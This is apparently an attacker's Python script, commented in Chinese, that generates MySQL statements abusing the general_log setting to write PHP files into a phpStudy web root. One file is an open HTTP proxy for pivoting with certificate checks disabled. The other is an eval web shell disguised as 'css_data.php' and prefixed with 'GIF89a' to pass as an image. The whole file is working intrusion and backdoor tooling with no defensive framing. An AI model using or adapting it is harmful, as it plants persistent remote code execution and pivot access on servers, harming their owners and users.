#!/usr/bin/env python3
"""gen_proxy2.py - 生成支持GET+POST的代理脚本"""
proxy_body = r'''<?php
$u=isset($_GET['u'])?$_GET['u']:'';
if($u){
  $ch=curl_init($u);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
  curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
  curl_setopt($ch,CURLOPT_TIMEOUT,20);
  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,10);
  curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
  curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
  $h=array();
  foreach(getallheaders() as $k=>$v){ if($k!='Host') $h[]=$k.': '.$v; }
  curl_setopt($ch,CURLOPT_HTTPHEADER,$h);
  if($_SERVER['REQUEST_METHOD']=='POST'){
    curl_setopt($ch,CURLOPT_POST,1);
    curl_setopt($ch,CURLOPT_POSTFIELDS,file_get_contents('php://input'));
  }
  $r=curl_exec($ch);
  $code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
  curl_close($ch);
  http_response_code($code);
  echo $r;
}
?>'''

shell_body = "<?php @eval($_POST[\"x\"]);echo \"OK\";?>"

name = 'proxy2.php'
sql = []
sql.append("SET GLOBAL general_log = OFF;")
sql.append("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/%s';" % name)
sql.append("SET GLOBAL general_log = ON;")
sql.append("SELECT 'GIF89a%s//'" % proxy_body.replace("'", "''").replace("?>", ""))
sql.append("SET GLOBAL general_log = OFF;")
with open('/tmp/proxy2.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')

# 同时重建css_data.php
sql2 = []
sql2.append("SET GLOBAL general_log = OFF;")
sql2.append("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/css_data.php';")
sql2.append("SET GLOBAL general_log = ON;")
sql2.append("SELECT 'GIF89a%s//'" % shell_body)
sql2.append("SET GLOBAL general_log = OFF;")
with open('/tmp/rebuild_css2.sql', 'w') as f:
    f.write('\n'.join(sql2) + '\n')
print('proxy2.sql + rebuild_css2.sql ready')
